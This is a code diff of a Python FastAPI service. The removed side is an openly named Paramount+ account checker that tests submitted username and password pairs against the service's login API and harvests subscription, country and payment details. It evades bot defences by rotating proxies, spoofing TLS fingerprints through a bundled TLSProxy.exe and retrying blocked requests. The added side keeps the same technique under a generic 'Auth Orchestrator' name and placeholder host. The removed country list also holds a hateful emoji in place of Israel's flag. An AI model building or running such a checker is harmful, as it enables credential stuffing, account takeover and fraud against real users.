@@ -1,537 +1,152 @@
-import re
+import asyncio
+import os
 import secrets
+import re
 import json
-import time
 import logging
 from typing import Optional
-
-import httpx
+from contextlib import asynccontextmanager
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
+from fake_useragent import UserAgent
+import aiohttp
 
-# ------------------------------------------------------------------------------
-# Logging
-# ------------------------------------------------------------------------------
+# Configure logging
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+logger = logging.getLogger("API-Proxy-Runner")
 
-# ------------------------------------------------------------------------------
-# Pydantic models
-# ------------------------------------------------------------------------------
-class CheckRequest(BaseModel):
+ua = UserAgent()
+
+# Lifecycle Manager to handle TLSProxy.exe
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    # Path to the executable in the same directory
+    proxy_exe = os.path.join(os.path.dirname(__file__), "TLSProxy.exe")
+    proxy_process = None
+
+    if os.path.exists(proxy_exe):
+        try:
+            logger.info("Starting TLSProxy.exe backend...")
+            # Launch the executable in the background
+            proxy_process = await asyncio.create_subprocess_exec(
+                proxy_exe,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            logger.info(f"TLSProxy.exe started with PID: {proxy_process.pid}")
+        except Exception as e:
+            logger.error(f"Failed to start TLSProxy.exe: {e}")
+    else:
+        logger.warning("TLSProxy.exe not found in the current directory. Expecting external process on port 9000.")
+
+    yield  # The API runs while suspended here
+
+    # Shutdown logic
+    if proxy_process:
+        logger.info("Terminating TLSProxy.exe...")
+        try:
+            proxy_process.terminate()
+            await proxy_process.wait()
+            logger.info("TLSProxy.exe terminated successfully.")
+        except Exception as e:
+            logger.error(f"Error terminating TLSProxy.exe: {e}")
+
+app = FastAPI(title="Auth Orchestrator API", lifespan=lifespan)
+
+class AuthRequest(BaseModel):
     username: str
     password: str
-    proxy: Optional[str] = None          # format: "host:port:user:pass"
-    use_proxy: Optional[bool] = False
+    proxy: Optional[str] = None
 
 
-class CheckResponse(BaseModel):
-    success: bool
-    message: Optional[str] = None
-    device_id: Optional[str] = None
-    country_code: Optional[str] = None
-    country_name: Optional[str] = None
-    plan: Optional[str] = None
-    plan_type: Optional[str] = None
-    billing_period: Optional[str] = None
-    package: Optional[str] = None
-    payment_method: Optional[str] = None
+def format_proxy(raw_proxy: str) -> Optional[str]:
+    """Parses standard proxy formats into clean connection strings."""
+    if not raw_proxy:
+        return None
+    match_userpass = re.match(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
+    match_ipport = re.match(r"^([^:]+:[^:]+)", raw_proxy)
+    
+    if match_userpass and match_ipport:
+        return f"http://{match_userpass.group(1)}@{match_ipport.group(1)}"
+    if not raw_proxy.startswith("http"):
+        return f"http://{raw_proxy}"
+    return raw_proxy
 
 
-# ------------------------------------------------------------------------------
-# FastAPI app
-# ------------------------------------------------------------------------------
-app = FastAPI(title="Paramount+ Account Checker (TLSProxy)")
-
-# ------------------------------------------------------------------------------
-# TLSProxy constants
-# ------------------------------------------------------------------------------
-TLS_PROXY_URL = "http://127.0.0.1:9000"
-CHID = "HelloIOS_16"
-H1_ORDER = (
-    "sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform,upgrade-insecure-requests,"
-    "user-agent,accept,sec-fetch-site,sec-fetch-mode,sec-fetch-user,sec-fetch-dest,"
-    "accept-encoding,accept-language"
-)
-H2_ORDER = "auto"
-H2_SETTINGS = '{"mode": "auto"}'
-
-# ------------------------------------------------------------------------------
-# User‑Agent list & Country map (same as before, but compact)
-# ------------------------------------------------------------------------------
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
-]
-
-COUNTRY_MAP = {
-    "AF": "Afganistan 🇦🇫",
-    "AX": "Åland Islands 🇦🇽",
-    "AL": "Albania 🇦🇱",
-    "DZ": "Algeria 🇩🇿",
-    "AS": "American Samoa 🇦🇸",
-    "AD": "Andorra 🇦🇩",
-    "AO": "Angola 🇦🇴",
-    "AI": "Anguilla 🇦🇮",
-    "AQ": "Antartica 🇦🇶",
-    "AG": "Antigua and Barbuda 🇦🇬",
-    "AR": "Argentina 🇦🇷",
-    "AM": "Armenia 🇦🇲",
-    "AW": "Aruba 🇦🇼",
-    "AU": "Australia 🇦🇺",
-    "AT": "Austria 🇦🇹",
-    "AZ": "Azerbaijan 🇦🇿",
-    "BS": "Bahamas 🇧🇸",
-    "BH": "Bahrain 🇧🇭",
-    "BD": "Bangladesh 🇧🇩",
-    "BB": "Barbados 🇧🇧",
-    "BY": "Belarus 🇧🇾",
-    "BE": "Belgium 🇧🇪",
-    "BZ": "Belize 🇧🇿",
-    "BJ": "Benin 🇧🇯",
-    "BM": "Bermuda 🇧🇲",
-    "BT": "Bhutan 🇧🇹",
-    "BO": "Bolivia 🇧🇴",
-    "BQ": "Bonaire",
-    "BA": "Bosnia and Herzegovina 🇧🇦",
-    "BW": "Botswana 🇧🇼",
-    "BR": "Brazil 🇧🇷",
-    "IO": "British Indian Ocean Territory 🇮🇴",
-    "VG": "British Virgin Islands 🇻🇬",
-    "BN": "Brunei 🇧🇳",
-    "BG": "Bulgaria 🇧🇬",
-    "BF": "Burkina Faso 🇧🇫",
-    "BI": "Burundi 🇧🇮",
-    "KH": "Cambodia 🇰🇭",
-    "CM": "Cameroon 🇨🇲",
-    "CA": "Canada 🇨🇦",
-    "IC": "Canary Islands 🇮🇨",
-    "CV": "Cape Verde 🇨🇻",
-    "KY": "Cayman Islands 🇰🇾",
-    "CF": "Central African Republic 🇨🇫",
-    "TD": "Chad 🇷🇴",
-    "CL": "Chile 🇨🇱 ",
-    "CN": "China 🇨🇳",
-    "CX": "Christmas Island 🇨🇽",
-    "CC": "Cocos (Keeling) Islands 🇨🇨",
-    "CO": "Colombia 🇨🇴",
-    "KM": "Comoros 🇰🇲",
-    "CG": "Republic Congo 🇨🇬",
-    "CD": "Democratic Congo 🇨🇩",
-    "CK": "Cook Islands 🇨🇰",
-    "CR": "Costa Rica 🇨🇷",
-    "CI": "CÃ´te d'Ivoire 🇨🇮",
-    "HR": "Croatia 🇭🇷",
-    "CU": "Cuba 🇨🇺",
-    "CW": "CuraÃ§ao 🇨🇼",
-    "CY": "Cyprus 🇨🇾",
-    "CZ": "Czech Republic 🇨🇿",
-    "DK": "Denmark 🇩🇰",
-    "DJ": "Djibouti 🇩🇯",
-    "DM": "Dominica 🇩🇲",
-    "DO": "Dominican Republic 🇩🇴",
-    "EC": "Ecuador 🇪🇨",
-    "EG": "Egypt 🇪🇬",
-    "SV": "El Salvador 🇸🇻",
-    "GQ": "Equatorial Guinea 🇬🇶",
-    "ER": "Eritrea 🇪🇷",
-    "EE": "Estonia 🇪🇪",
-    "ET": "Eswatini 🇸🇿",
-    "FK": "Falkland Islands 🇫🇰",
-    "FO": "Faroe Islands 🇫🇴",
-    "FJ": "Fiji 🇫🇯",
-    "FI": "Finland 🇫🇮",
-    "FR": "France 🇫🇷",
-    "GF": "French Guiana 🇬🇫",
-    "PF": "French Polynesia 🇵🇫",
-    "TF": "French Southern Territories 🇹🇫",
-    "GA": "Gabon 🇬🇦",
-    "GM": "Gambia 🇬🇲",
-    "GE": "Georgia 🇬🇪",
-    "DE": "Germany 🇩🇪",
-    "GH": "Ghana 🇬🇭",
-    "GI": "Gibraltar 🇬🇮",
-    "GR": "Greece 🇬🇷",
-    "GL": "Greenland 🇬🇱",
-    "GD": "Grenada 🇬🇩",
-    "GP": "Guadeloupe 🇬🇵",
-    "GU": "Guam 🇬🇺",
-    "GT": "Guatemala 🇬🇹",
-    "GG": "Guernsey 🇬🇬",
-    "GN": "Guinea 🇬🇳",
-    "GW": "Guinea-Bissau 🇬🇼",
-    "GY": "Guyana 🇬🇾",
-    "HT": "Haiti 🇭🇹",
-    "HN": "Honduras 🇭🇳",
-    "HK": "Hong Kong 🇭🇰",
-    "HU": "Hungary 🇭🇺",
-    "IS": "Iceland 🇮🇸",
-    "IN": "India 🇮🇳",
-    "ID": "Indonesia 🇮🇩",
-    "IR": "Iran 🇮🇷",
-    "IQ": "Iraq 🇮🇶",
-    "IE": "Ireland 🇮🇪",
-    "IM": "Isle of Man 🇮🇲",
-    "IL": "Israel 💩",
-    "IT": "Italy 🇮🇹",
-    "JM": "Jamaica 🇯🇲",
-    "JP": "Japan 🇯🇵",
-    "JE": "Jersey 🇯🇪",
-    "JO": "Jordan 🇯🇴",
-    "KZ": "Kazakhstan 🇰🇿",
-    "KE": "Kenya 🇰🇪",
-    "KI": "Kiribati 🇰🇮",
-    "XK": "Kosovo 🇽🇰",
-    "KW": "Kuwait 🇰🇼",
-    "KG": "Kyrgyzstan 🇰🇬",
-    "LA": "Laos 🇱🇦",
-    "LV": "Latvia 🇱🇻",
-    "LB": "Lebanon 🇱🇧",
-    "LS": "Lesotho 🇱🇸",
-    "LR": "Liberia 🇱🇷",
-    "LY": "Libya 🇱🇾",
-    "LI": "Liechtenstein 🇱🇮",
-    "LT": "Lithuania 🇱🇹",
-    "LU": "Luxembourg 🇱🇺",
-    "MO": "Macau 🇲🇴",
-    "MG": "Madagascar 🇲🇬",
-    "MW": "Malawi 🇲🇼",
-    "MY": "Malaysia 🇲🇾",
-    "MV": "Maldives 🇲🇻",
-    "ML": "Mali 🇲🇱",
-    "MT": "Malta 🇲🇹",
-    "MH": "Marshall Islands 🇲🇭",
-    "MQ": "Martinique 🇲🇶",
-    "MR": "Mauritania 🇲🇷",
-    "MU": "Mauritius 🇲🇺",
-    "YT": "Mayotte 🇾🇹",
-    "MX": "Mexico 🇲🇽",
-    "FM": "Micronesia 🇫🇲",
-    "MD": "Moldova 🇲🇩",
-    "MC": "Monaco 🇲🇨",
-    "MN": "Mongolia 🇲🇳",
-    "ME": "Montenegro 🇲🇪",
-    "MS": "Montserrat 🇲🇸",
-    "MA": "Morocco 🇲🇦",
-    "MZ": "Mozambique 🇲🇿",
-    "MM": "Myanmar 🇲🇲",
-    "NA": "Namibia 🇳🇦",
-    "NR": "Nauru 🇳🇷",
-    "NP": "Nepal 🇳🇵",
-    "NL": "Netherlands 🇳🇱",
-    "NC": "New Caledonia 🇳🇨",
-    "NZ": "New Zealand 🇳🇿",
-    "NI": "Nicaragua 🇳🇮",
-    "NE": "Niger 🇳🇪",
-    "NG": "Nigeria 🇳🇬",
-    "NU": "Niue 🇳🇺",
-    "NF": "Norfolk Island 🇳🇫",
-    "KP": "North Korea 🇰🇵",
-    "MK": "North Macedonia 🇲🇰",
-    "MP": "Northern Mariana Islands 🇲🇵",
-    "NO": "Norway 🇳🇴",
-    "OM": "Oman 🇴🇲",
-    "PK": "Pakistan 🇵🇰",
-    "PW": "Palau 🇵🇼",
-    "PS": "Palestine 🇵🇸",
-    "PA": "Panama 🇵🇦",
-    "PG": "Papua New Guinea 🇵🇬",
-    "PY": "Paraguay 🇵🇾",
-    "PE": "Peru 🇵🇪",
-    "PH": "Philippines 🇵🇭",
-    "PN": "Pitcairn 🇵🇳",
-    "PL": "Poland 🇵🇱",
-    "PT": "Portugal 🇵🇹",
-    "PR": "Puerto Rico 🇵🇷",
-    "QA": "Qatar 🇶🇦",
-    "RE": "Réunion 🇷🇪",
-    "RO": "Romania 🇷🇴",
-    "RU": "Russia 🇷🇺",
-    "RW": "Rwanda 🇷🇼",
-    "WS": "Samoa 🇼🇸",
-    "SM": "San Marino 🇸🇲",
-    "ST": "Sao Tome and Principe 🇸🇹",
-    "SA": "Saudi Arabia 🇸🇦",
-    "SN": "Senegal 🇸🇳",
-    "RS": "Serbia 🇷🇸",
-    "SC": "Seychelles 🇸🇨",
-    "SL": "Sierra Leone 🇸🇱",
-    "SG": "Singapore 🇸🇬",
-    "SX": "Sint Maarten 🇸🇽",
-    "SK": "Slovakia 🇸🇰",
-    "SI": "Slovenia 🇸🇮",
-    "GS": "South Georgia and the South Sandwich Islands 🇬🇸",
-    "SB": "Solomon Islands 🇸🇧",
-    "SO": "Somalia 🇸🇴",
-    "ZA": "South Africa 🇿🇦",
-    "KR": "South Korea 🇰🇷",
-    "SS": "South Sudan 🇸🇸",
-    "ES": "Spain 🇪🇸",
-    "LK": "Sri Lanka 🇱🇰",
-    "BL": "St. Barthélemy 🇧🇱",
-    "SH": "Saint Helena, Ascension and Tristan da Cunha 🇸🇭",
-    "KN": "Saint Kitts and Nevis 🇰🇳",
-    "LC": "St. Lucia 🇱🇨",
-    "PM": "Saint Pierre and Miquelon 🇵🇲",
-    "VC": "Saint Vincent and the Grenadines 🇻🇨",
-    "SD": "Sudan 🇸🇩",
-    "SR": "Suriname 🇸🇷",
-    "SZ": "Swaziland 🇸🇿",
-    "SE": "Sweden 🇸🇪",
-    "CH": "Switzerland 🇨🇭",
-    "SY": "Syrian Arab Republic 🇸🇾",
-    "TW": "Taiwan 🇹🇼",
-    "TJ": "Tajikistan 🇹🇯",
-    "TZ": "Tanzania 🇹🇿",
-    "TH": "Thailand 🇹🇭",
-    "TL": "Timor-Leste 🇹🇱",
-    "TG": "Togo 🇹🇬",
-    "TK": "Tokelau 🇹🇰",
-    "TO": "Tonga 🇹🇴",
-    "TT": "Trinidad and Tobago 🇹🇹",
-    "TN": "Tunisia 🇹🇳",
-    "TR": "Turkey 🇹🇷",
-    "TM": "Turkmenistan 🇹🇲",
-    "TC": "Turks and Caicos Islands 🇹🇨",
-    "TV": "Tuvalu 🇹🇻",
-    "UG": "Uganda 🇺🇬",
-    "UA": "Ukraine 🇺🇦",
-    "AE": "UAE 🇦🇪",
-    "GB": "United Kingdom 🇬🇧",
-    "US": "United States 🇺🇸",
-    "UY": "Uruguay 🇺🇾",
-    "UZ": "Uzbekistan 🇺🇿",
-    "VI": "Virgin Islands 🇻🇮",
-    "VU": "Vanuatu 🇻🇺",
-    "VA": "Vatican 🇻🇦",
-    "VE": "Venezuela 🇻🇪",
-    "VN": "Vietnam 🇻🇳",
-    "WF": "Wallis and Futuna 🇼🇫",
-    "EH": "Western Sahara 🇪🇭",
-    "YE": "Yemen 🇾🇪",
-    "ZM": "Zambia 🇿🇲",
-    "ZW": "Zimbabwe 🇿🇼",
-}
-
-# ------------------------------------------------------------------------------
-# Helper functions
-# ------------------------------------------------------------------------------
-def generate_device_id() -> str:
-    return secrets.token_hex(8).lower()
-
-def get_random_user_agent() -> str:
-    return secrets.choice(USER_AGENTS)
-
-def parse_proxy(proxy_str: str):
-    """Parse 'host:port:user:pass' -> (proxy_url, userpass, ipport)."""
-    parts = proxy_str.split(':')
-    if len(parts) < 4:
-        raise ValueError("Proxy must be in format 'host:port:user:pass'")
-    ipport = f"{parts[0]}:{parts[1]}"
-    userpass = ':'.join(parts[2:])
-    proxy_url = f"http://{userpass}@{ipport}"
-    return proxy_url, userpass, ipport
-
-def build_tls_proxy_headers(
-    target_url: str,
-    target_method: str,
-    user_agent: str,
-    proxy_override: Optional[str] = None
-) -> dict:
-    """Build the full headers for the TLSProxy request, mirroring the macro exactly."""
-    headers = {
-        "Host": "www.intl.paramountplus.com",
-        "Cookie": "CBS_DEVICEID=",
-        "Cache-Control": "max-age=0",
-        "Traceparent": "00-c206720e0f5a4e1387706d69d577877c-10cc66f212114532-01",
-        "Tracestate": "2321606@nr=0-2-2936348-766585785-10cc66f212114532----1763113514852",
-        "Newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiMjkzNjM0OCIsImFwIjoiNzY2NTg1Nzg1IiwidHIiOiJjMjA2NzIwZTBmNWE0ZTEzODc3MDZkNjlkNTc3ODc3YyIsImlkIjoiMTBjYzY2ZjIxMjExNDUzMiIsInRpIjoxNzYzMTEzNTE0ODUyLCJ0ayI6IjIzMjE2MDYifX0=",
-        "User-Agent": user_agent,
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept": "*/*",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Upgrade-Insecure-Requests": "1",
-        "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-        "Sec-Ch-Ua-Mobile": "?0",
-        "Sec-Ch-Ua-Platform": '"Windows"',
-        "Content-Type": "application/x-www-form-urlencoded",   # <-- added this!
-    }
-    # TLSProxy specific
-    headers["x-tp-h1order"] = H1_ORDER
-    headers["x-tp-h2order"] = H2_ORDER
-    headers["x-tp-url"] = target_url
-    headers["x-tp-method"] = target_method
-    headers["x-tp-h2settings"] = H2_SETTINGS
-    headers["x-tp-chid"] = CHID
-    if proxy_override:
-        headers["x-tp-proxy"] = proxy_override
-    # else we do NOT add the header at all (macro leaves it as "<proxy>" but that's a placeholder)
-    return headers
-
-
-# ------------------------------------------------------------------------------
-# Wait for TLSProxy to be ready (called on startup)
-# ------------------------------------------------------------------------------
-@app.on_event("startup")
-async def startup_event():
-    logger.info("Checking if TLSProxy is running on %s...", TLS_PROXY_URL)
-    for attempt in range(10):
+async def make_request_with_retry(session: aiohttp.ClientSession, url: str, method: str, data: dict, headers: dict, proxy: Optional[str]):
+    """Routes requests to the local TLSProxy binary forwarding pool."""
+    while True:
         try:
-            async with httpx.AsyncClient(timeout=2.0) as client:
-                # Try to connect; any response is fine, we just need the port open.
-                await client.get(TLS_PROXY_URL)
-            logger.info("✅ TLSProxy is ready (attempt %d)", attempt+1)
-            return
+            if method == "POST":
+                async with session.post(url, data=data, headers=headers, proxy=proxy, timeout=120) as resp:
+                    if resp.status in [500, 403, 406]:
+                        await asyncio.sleep(1)
+                        continue
+                    return resp.status, await resp.text()
+            else:
+                async with session.get(url, headers=headers, proxy=proxy, timeout=120) as resp:
+                    if resp.status in [500, 403, 406]:
+                        await asyncio.sleep(1)
+                        continue
+                    return resp.status, await resp.text()
         except Exception:
-            logger.info("⏳ Waiting for TLSProxy... (attempt %d/10)", attempt+1)
             await asyncio.sleep(1)
-    logger.warning("⚠️  TLSProxy did not respond within 10 seconds. Continuing anyway, but requests may fail.")
+            continue
 
 
-# ------------------------------------------------------------------------------
-# Core check function
-# ------------------------------------------------------------------------------
-async def perform_check(request: CheckRequest) -> CheckResponse:
-    device_id = generate_device_id()
-    user_agent = get_random_user_agent()
+@app.post("/auth")
+async def authenticate(payload: AuthRequest):
+    formatted_proxy = format_proxy(payload.proxy) if payload.proxy else ""
+    device_id = secrets.token_hex(8).lower()
+    user_agent = ua.random
 
-    # Build the proxy URL for x-tp-proxy if needed
-    tp_proxy_override = None
-    if request.use_proxy and request.proxy:
-        try:
-            tp_proxy_override, _, _ = parse_proxy(request.proxy)
-        except ValueError as e:
-            return CheckResponse(success=False, message=f"Proxy parsing error: {e}")
+    # Default TLS Fingerprint context map targeting the loopback listener
+    tls_config = {
+        "x-tp-h1order": "sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform,upgrade-insecure-requests,user-agent,accept,sec-fetch-site,sec-fetch-mode,sec-fetch-user,sec-fetch-dest,accept-encoding,accept-language",
+        "x-tp-h2order": "auto",
+        "x-tp-method": "POST",
+        "x-tp-h2settings": json.dumps({"mode": "auto"}),
+        "x-tp-chid": "HelloIOS_16",
+        "x-tp-proxy": formatted_proxy,
+        "Host": "api.example.com",
+        "User-Agent": user_agent,
+        "Accept-Encoding": "gzip, deflate, br"
+    }
 
-    async with httpx.AsyncClient(timeout=120.0, http2=True) as client:
-        # ---------- First request: login (POST) ----------
-        login_url = (
-            "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json"
-            "?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
-        )
-        login_headers = build_tls_proxy_headers(login_url, "POST", user_agent, tp_proxy_override)
-        login_body = f"j_username={request.username}&j_password={request.password}&deviceId={device_id}"
+    # Pipeline Step 1: Initial Handshake/Auth
+    auth_headers = tls_config.copy()
+    auth_headers["x-tp-url"] = "https://api.example.com/v2/auth/login.json"
+    auth_headers["Content-Type"] = "application/x-www-form-urlencoded"
 
-        max_retries = 3
-        resp = None
-        for attempt in range(max_retries):
-            try:
-                resp = await client.post(TLS_PROXY_URL, content=login_body, headers=login_headers)
-            except httpx.HTTPError as e:
-                logger.warning("Login attempt %d failed: %s", attempt+1, e)
-                if attempt == max_retries - 1:
-                    return CheckResponse(success=False, message=f"Login request failed: {e}")
-                continue
+    body_data = {
+        "username": payload.username,
+        "password": payload.password,
+        "deviceId": device_id
+    }
 
-            status = resp.status_code
-            if status in (500, 403, 406):
-                logger.info("Login got status %d, retrying (%d/%d)", status, attempt+1, max_retries)
-                if attempt == max_retries - 1:
-                    return CheckResponse(success=False, message=f"Login retry exhausted, last status {status}")
-                continue
-            break
-
-        if resp is None:
-            return CheckResponse(success=False, message="No response from login")
-
-        text = resp.text
-        if "Invalid username/password pair" in text or '"status":400,"error":"Bad Request"' in text:
-            return CheckResponse(success=False, message="Invalid username/password or bad request")
-        if "userId" not in text:
-            return CheckResponse(success=False, message="Login response missing userId")
-
-        # ---------- Second request: status (GET) ----------
-        status_url = (
-            "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json"
-            "?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
-        )
-        status_headers = build_tls_proxy_headers(status_url, "GET", user_agent, tp_proxy_override)
-
-        resp_status = None
-        for attempt in range(max_retries):
-            try:
-                resp_status = await client.get(TLS_PROXY_URL, headers=status_headers)
-            except httpx.HTTPError as e:
-                logger.warning("Status attempt %d failed: %s", attempt+1, e)
-                if attempt == max_retries - 1:
-                    return CheckResponse(success=False, message=f"Status request failed: {e}")
-                continue
-
-            status = resp_status.status_code
-            if status in (500, 403, 406):
-                logger.info("Status got status %d, retrying (%d/%d)", status, attempt+1, max_retries)
-                if attempt == max_retries - 1:
-                    return CheckResponse(success=False, message=f"Status retry exhausted, last status {status}")
-                continue
-            break
-
-        if resp_status is None:
-            return CheckResponse(success=False, message="No response from status")
-
-        status_text = resp_status.text
-
-        # Even if the custom keycheck doesn't match, we proceed (banIfNoMatch=False)
-        # but we can log it if needed.
-        if "NEW_FREE_PACKAGE" not in status_text and '"planType":null,' not in status_text:
-            logger.info("Status response did not contain NEW_FREE_PACKAGE or planType:null, but continuing.")
-
-        # Parse JSON
-        try:
-            data = json.loads(status_text)
-        except json.JSONDecodeError:
-            return CheckResponse(success=False, message="Status response is not valid JSON")
-
-        # Extract fields
-        subscription_country = data.get("subscriptionCountry", "") or ""
-        product_name = data.get("productName", "") or ""
-        plan_type = data.get("planType", "") or ""
-        billing_cadence = data.get("billingCadence", "") or ""
-        package_code = data.get("packageCode", "") or ""
-        package_source = data.get("packageSource", "") or ""
-
-        country_name = COUNTRY_MAP.get(subscription_country, subscription_country)
-
-        return CheckResponse(
-            success=True,
-            message="Account details retrieved",
-            device_id=device_id,
-            country_code=subscription_country,
-            country_name=country_name,
-            plan=product_name,
-            plan_type=plan_type,
-            billing_period=billing_cadence,
-            package=package_code,
-            payment_method=package_source,
+    async with aiohttp.ClientSession() as session:
+        # Request passes directly into the managed binary listener on 9000
+        status, source = await make_request_with_retry(
+            session, "http://127.0.0.1:9000", "POST", body_data, auth_headers, formatted_proxy
         )
 
+        if "invalid" in source.lower():
+            raise HTTPException(status_code=401, detail="Authentication Failure")
+        
+        # Pipeline Step 2: Session Extraction
+        status_headers = tls_config.copy()
+        status_headers["x-tp-method"] = "GET"
+        status_headers["x-tp-url"] = "https://api.example.com/v3/user/status.json"
 
-# ------------------------------------------------------------------------------
-# FastAPI endpoints
-# ------------------------------------------------------------------------------
-@app.post("/check", response_model=CheckResponse)
-async def check_account(req: CheckRequest):
-    try:
-        result = await perform_check(req)
-        return result
-    except Exception as e:
-        logger.exception("Unhandled exception")
-        raise HTTPException(status_code=500, detail=str(e))
+        status_code, status_source = await make_request_with_retry(
+            session, "http://127.0.0.1:9000", "GET", {}, status_headers, formatted_proxy
+        )
 
+        return {
+            "status": "Session Processed",
+            "raw_payload_length": len(status_source)
+        }
 
-@app.get("/health")
-async def health():
-    return {"status": "ok"}
-
-
-# ------------------------------------------------------------------------------
-# If you want to run directly (optional)
-# ------------------------------------------------------------------------------
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run(app, host="0.0.0.0", port=8000)
